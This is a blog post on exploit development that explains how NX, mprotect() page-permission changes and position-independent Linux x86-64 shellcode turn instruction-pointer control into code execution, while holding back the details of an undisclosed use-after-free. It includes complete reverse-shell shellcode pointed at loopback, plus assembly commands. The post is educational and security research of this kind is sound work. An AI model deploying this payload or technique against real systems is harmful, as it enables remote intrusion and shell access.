---
layout: post
title: "From RIP control to shellcode execution"
date: 2026-09-22 12:00:00 +0200
categories: Exploit-Development
excerpt: "A practical primer on NX, mprotect(), and position-independent Linux x86-64 shellcode, framed by an exploit I cannot disclose just yet."
---

I recently found a use-after-free in a network-facing daemon. The bug can be taken all the way to remote code execution, but coordinated disclosure is still in progress, so I cannot identify the project or show the vulnerability-specific chain yet.

That means no protocol details, source locations, object layouts, heap choreography, gadgets, offsets, or working exploit (it's a doozy, though, you'll love it XD). Those belong in the full write-up after the maintainers have shipped a fix and I have permission to discuss the issue properly.

What I can discuss is the part that comes after the target-specific work.

At a high level, the UAF gave me a route to instruction pointer (RIP) control. The exploit also had to defeat ASLR and the stack canary. I am intentionally skipping the mechanisms used to cross those barriers. The useful general lesson begins at the point where execution can be redirected: how do we turn controlled data into code on a modern Linux process with NX enabled?

# The short version

The exploitation stage reduced to this abstract sequence:

```text
Memory corruption
      |
      v
Control of the instruction pointer
      |
      v
Invoke mprotect()
      |
      v
RW memory becomes executable
      |
      v
Transfer execution
      |
      v
Shellcode go brr
```

Again, the diagram deliberately hides the interesting target-specific machinery. It says nothing about how the dangling reference was produced, what object was reused, how RIP was reached, how ASLR or the canary were defeated, or where any runtime address came from. It is a map of the final exploitation problem, not a reproduction guide.

# Why NX changes the problem

Historically, memory corruption exploitation could be almost laughably direct: place machine code in a writable buffer, redirect execution to that buffer, and let the processor do the rest. GG EZ.

NX (the 'no execute' bit) separates writable memory from executable memory. A normal stack or heap mapping is generally readable and writable, but not executable. The process can still store arbitrary bytes there; the CPU simply refuses to fetch those bytes as instructions.

This is the practical effect of a W^X policy: a page should be writable or executable, but ideally not both. If RIP lands on a non-executable page, the processor raises a protection fault instead of running the payload.

RIP control is therefore not synonymous with code execution. It is a powerful primitive, but the destination still has to contain useful instructions on a page from which the CPU is allowed to execute.

Code-reuse attacks (think ROP or ret2libc) work around this by chaining instructions which already exist in executable mappings. This is usually further complicated by ASLR and RELRO, but we'll get into that when I can talk about this in detail.

Another option is to use code reuse only long enough to change the permissions on a mapping which already contains attacker-controlled bytes. On Linux, that leads naturally to `mprotect()`.

# What mprotect() actually does

The interface is small:

```c
int mprotect(void *addr, size_t len, int prot);
```

For a region which should be readable, writable, and executable, the conceptual call is:

```c
mprotect(page_start, page_length,
         PROT_READ | PROT_WRITE | PROT_EXEC);
```

`mprotect()` changes the protection flags on pages which are already mapped into the process. It does not allocate memory, copy a payload, or find the shellcode. The exploit must already know which mapped range it wants to modify.

There are two details worth getting right.

First, `addr` has to be aligned to a page boundary. On a system with 4 KiB pages, the low 12 bits of the address are cleared:

```c
page_start = payload_address & ~(page_size - 1);
```

Second, the length must cover every page touched by the payload. If the bytes cross a page boundary, changing only the first page will produce a confusing partial success: execution begins, advances into the next page, and then faults.

A general range calculation looks like this:

```c
page_start = payload_address & ~(page_size - 1);
page_end   = (payload_address + payload_length + page_size - 1)
             & ~(page_size - 1);
page_length = page_end - page_start;
```

On Linux x86-64, `mprotect` is syscall 10. An exploit may reach it through a normal imported function, another callable wrapper, or a suitable syscall path already present in executable code. Which option is available is target-dependent, and I am leaving the route used in this research undisclosed for now.

# The state an exploit needs

Ignoring how each primitive was obtained, a permission-change design needs four things:

1. **Control flow.** There must be a way to steer execution through the setup and into the final payload.
2. **Known mapped memory.** The exploit needs a usable address for memory which exists in the process.
3. **Controlled bytes.** The intended machine code must survive in that memory until execution reaches it.
4. **A callable permission-change path.** The exploit must establish the `mprotect` arguments and invoke it without losing control afterward.

The last clause is easy to underestimate. Finding the bytes for a `syscall` instruction does not necessarily produce a usable gadget. Execution continues after the kernel returns. If the following instruction dereferences a register that now contains the syscall return value, writes through an uncontrolled pointer, or depends on state clobbered by `syscall`, the chain still dies. For example,

```asm
syscall
mov [rax], rdi
ret
```

If we're making the `mprotect` syscall directly, success returns zero and failure returns a negative error number. (The libc wrapper translates that failure into `-1` and sets `errno`.) Neither result is a valid writable userspace address, so the dereference faults. No pwnage for you.

The continuation matters as much as the instruction you searched for.

The same principle applies when invoking a normal function. A return-oriented chain reaches a function via `ret`, not `call`, so the stack may not have the alignment the ABI expects. Many simple functions tolerate imperfect alignment until an instruction such as `movaps` does not. Track the stack in eight-byte steps and know its alignment at every function boundary.

# Function ABI versus syscall ABI

Linux x86-64 has two related calling conventions which are easy to mix up.

For ordinary System V function calls, the first six integer or pointer arguments are passed in:

```text
RDI, RSI, RDX, RCX, R8, R9
```

For a direct Linux syscall, the syscall number goes in `RAX`, and the first six arguments use:

```text
RDI, RSI, RDX, R10, R8, R9
```

Notice the fourth argument: `RCX` for a function call, `R10` for a syscall. The `syscall` instruction also clobbers `RCX` and `R11`.

This distinction matters when reasoning about wrappers. Calling libc's `syscall()` is an ordinary function call from the caller's perspective; the wrapper performs the translation into the kernel ABI. Entering a raw `syscall` instruction requires the kernel register layout directly.

# Shellcode fundamentals

Shellcode is not simply assembly without a linker. It is assembly written for a hostile and uncertain execution environment.

## Position independence

The payload should not depend on being loaded at a fixed virtual address. ASLR exists specifically to make those assumptions unreliable.

On x86-64, RIP-relative addressing is the usual way to refer to embedded data:

```nasm
lea rsi, [rel message]
```

That computes the address from the current instruction pointer rather than baking in an absolute location.

## Known register state

Do not assume registers begin at zero or contain values left over from a friendly test harness. Initialise every value the payload relies on. Partial-register writes also deserve care: changing `al` does not clear the upper 56 bits of `rax`. A common compact pattern is to zero the full register first and then set its low byte.

## The stack is live memory

Writable stack space is useful for strings, structures, and argument arrays, but it is not inert storage. The vulnerable function, signal handling, callbacks, or code invoked during the chain may continue writing to the active stack region.

Verify payload bytes at every boundary: the assembled file, the exploit's in-memory buffer, the transmitted payload, and finally the target process. If the first three match and target memory does not, the encoder is probably innocent. Something in the live process reused the region.

## Stack alignment

Direct syscalls do not impose the same call-site alignment requirement as ordinary functions. If shellcode calls into libc or another compiled function, however, it must respect the System V ABI. Before a conventional call, keep the stack 16-byte aligned as required by the called code's expectations.

## Size and simplicity

Compact payloads fit into more constrained primitives and create fewer opportunities for corruption. Compact does not mean cryptic at all costs. During development, reliability and observable progress are more valuable than saving three bytes.

# Starting with a benign Linux x86-64 payload

The following NASM payload writes `hello\n` to standard output and exits cleanly. There is no shell, network connection, or target-specific code in it.

```nasm
bits 64
global _start

section .text
_start:
    ; write(1, message, 6)
    xor eax, eax
    mov al, 1
    mov edi, eax
    lea rsi, [rel message]
    xor edx, edx
    mov dl, message_len
    syscall

    ; exit(0)
    xor edi, edi
    xor eax, eax
    mov al, 60
    syscall

message:
    db "hello", 10
message_len equ $ - message
```

This tiny example demonstrates most of the fundamentals:

* it uses the Linux syscall ABI directly;
* its data reference is position-independent;
* it explicitly establishes the registers it depends on;
* it does not require libc, a GOT entry, or a fixed load address;
* its behaviour is obvious under a debugger.

## Reusing my lab shellcode

For a more realistic example, I reused the reverse-shell payload from my research package. The version below is deliberately pointed at loopback, keeping it useful as a lab example without publishing any research-environment callback details:

```nasm
; Linux x86-64 - loopback lab configuration
bits 64

%define IP_IMM    0x0100007f  ; 127.0.0.1 in memory
%define PORT_IMM  0x5c11      ; htons(4444)

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov eax, 41
    mov edi, 2
    mov esi, 1
    xor edx, edx
    syscall

    test rax, rax
    js fail
    mov r12, rax

    ; Build sockaddr_in on the stack
    sub rsp, 16
    xor eax, eax
    mov qword [rsp], rax
    mov qword [rsp + 8], rax
    mov word  [rsp], 2
    mov word  [rsp + 2], PORT_IMM
    mov dword [rsp + 4], IP_IMM

    ; connect(fd, &sockaddr, 16)
    mov eax, 42
    mov rdi, r12
    mov rsi, rsp
    mov edx, 16
    syscall

    test rax, rax
    js fail

    ; dup2(fd, 0), dup2(fd, 1), dup2(fd, 2)
    mov eax, 33
    mov rdi, r12
    xor esi, esi
    syscall
    test rax, rax
    js fail

    mov eax, 33
    mov rdi, r12
    mov esi, 1
    syscall
    test rax, rax
    js fail

    mov eax, 33
    mov rdi, r12
    mov esi, 2
    syscall
    test rax, rax
    js fail

    ; execve("/bin//sh", ["/bin//sh", "-i", NULL], NULL)
    xor edx, edx

    push rdx
    push word 0x692d
    mov r13, rsp

    push rdx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp

    push rdx
    push r13
    push rdi
    mov rsi, rsp

    mov eax, 59
    syscall

fail:
    ; Exit instead of falling through into arbitrary bytes
    mov edi, eax
    mov eax, 60
    syscall
```

The payload keeps the socket descriptor in `R12`, builds `sockaddr_in` directly on the stack, connects to the configured endpoint, maps the socket onto standard input, output, and error, and constructs both the command string and `argv` array without absolute addresses. The doubled slash in `/bin//sh` is harmless to the filesystem and makes the path fit neatly into one eight-byte immediate.

The IP and port constants look reversed because x86 is little-endian while network fields are stored in network byte order. `PORT_IMM` is the in-memory representation of `htons(4444)`. The original source uses a private lab address; I substituted `127.0.0.1` here so the published example remains self-contained.

Every syscall result is tested. On failure, the payload exits cleanly instead of falling through into whatever bytes happen to follow it. That is not merely tidiness: predictable failure makes debugging substantially easier when shellcode is being reached through a larger control-flow chain.

For this article, the important connection is mechanical. Once `mprotect()` has made the containing pages executable and control reaches `_start`, the payload is independent of the undisclosed use-after-free and its exploitation chain. It is simply position-independent machine code executing under the process's existing security context.

For assembly and inspection:

```bash
nasm -f bin reverse_shell.asm -o reverse_shell.bin
xxd -g1 reverse_shell.bin
```

Because a flat shellcode binary has no ELF loader around it, testing should be done in a purpose-built harness inside a controlled lab. Start with the benign `write()` payload. Once instruction-pointer transfer, page permissions, register state, and clean exit are proven, the loopback-only network payload can test the additional socket and descriptor-management stages.

# From a use-after-free to RCE

The undisclosed exploit travelled a much longer path than the final abstraction suggests. A use-after-free had to become a stable corruption primitive. That primitive had to become reliable control of RIP. ASLR and the stack canary had to be defeated. The process then needed a viable route to `mprotect()`, a correctly aligned page range, intact payload bytes, and an explicit transfer into shellcode.

![Redacted terminal output showing the generic control-flow and permission-change stages completing before a shell connection is established.]({{ site.baseurl }}/assets/img/research/uaf-to-rce-redacted.png)

*A successful lab run. Target-specific object state, addresses, gadget selection, offsets, payload dimensions, and network identifiers have been redacted while coordinated disclosure remains in progress.*

The final shape was simple:

```text
use-after-free -> control flow -> permission change -> payload execution
```

Getting there was not.

The most valuable debugging lesson was to stop treating writable memory - especially the stack - as static storage. A payload can be correct when generated and still be damaged by later activity in the process. When execution crashes in apparently valid shellcode, compare the expected bytes with target memory before rewriting the assembly. A contiguous patch of unexpected data is evidence about lifetime and placement, not merely "bad shellcode".

Another lesson: the exact primitive you want does not have to be imported by name. A more generic interface may offer the same capability with a cleaner continuation. Conversely, a byte sequence which looks perfect in a gadget search can be useless once you disassemble the instructions which follow it.

# Disclosure boundary

The vulnerable application, protocol, affected component, trigger, object lifetime, heap behaviour, race conditions, leaks, write primitive, mitigation bypasses, gadget selection, offsets, payload layout, and exploit implementation are intentionally omitted.

The project is still working through coordinated disclosure. Publishing those details now could allow readers to identify the software, reproduce the vulnerability, or reconstruct the exploit before users have had a fair chance to patch.

Once remediation is public and I have permission to discuss the case, I plan to extend this article with the full journey: root cause, reachability, exploitation constraints, failed approaches, final chain, and the engineering required to make it reliable across varied environments.

For now, the responsible stopping point is the general technique. This research was performed in a controlled environment and is shared for defensive education and authorised security research only.

Happy Hacking!
